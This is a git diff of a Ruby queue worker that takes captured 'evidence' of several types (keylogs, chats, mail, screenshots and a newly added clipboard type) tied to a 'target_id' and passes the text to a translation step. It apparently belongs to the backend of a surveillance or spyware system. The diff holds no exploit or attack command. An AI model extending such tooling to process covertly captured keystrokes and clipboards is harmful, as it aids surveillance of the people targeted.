@@ -26,6 +26,7 @@ class Processor
     loop do
       # get the first entry from the queue and mark it as processed to avoid
       # conflicts with multiple processors
+      #if entry = coll.find_and_modify({query: {flag: TransQueue::QUEUED}, update: {"$set" => {flag: TransQueue::PROCESSED}}})
       if entry = coll.find_and_modify({query: {flag: TransQueue::QUEUED}, update: {"$set" => {flag: TransQueue::PROCESSED}}})
         process entry
       else
@@ -47,8 +48,6 @@ class Processor
     # dump the test to a file
     dump_to_file(entry['target_id'], ev, temp)
     size = File.size(temp)
-
-    trace :debug, "TEXT: #{temp} (#{size.to_s_bytes})"
 
     # invoke the ocr on the temp file and get the result
     if SDL.translate(temp, output)
@@ -73,15 +72,12 @@ class Processor
 
     ev.save
 
-    trace :info, "Evidence processed in #{Time.now - start} seconds - image #{size.to_s_bytes} -> text #{data[:tr].size.to_s_bytes}"
+    trace :info, "Evidence #{ev[:type]} processed in #{Time.now - start} seconds - text #{size.to_s_bytes} -> tr #{data[:tr].size.to_s_bytes}"
 
   rescue Exception => e
     trace :error, "Cannot process evidence: #{e.message}"
-    trace :error, e.backtrace.join("\n")
+    #trace :error, e.backtrace.join("\n")
     sleep 1
-    #FileUtils.rm_rf temp
-    #FileUtils.mv temp, temp + '.jpg'
-    #exit!
   end
 
   def self.dump_to_file(target, evidence, file)
@@ -91,6 +87,8 @@ class Processor
       when 'keylog'
         content = evidence[:data]['content']
       when 'chat'
+        content = evidence[:data]['content']
+      when 'clipboard'
         content = evidence[:data]['content']
       when 'message'
         if evidence[:data][:type] == 'mail'
@@ -104,6 +102,8 @@ class Processor
         content = file.read
       when 'screenshot'
         content = evidence[:data]['body']
+      else
+        raise 'unknown format'
     end
 
     File.open(file, 'w') {|f| f.write content} if content
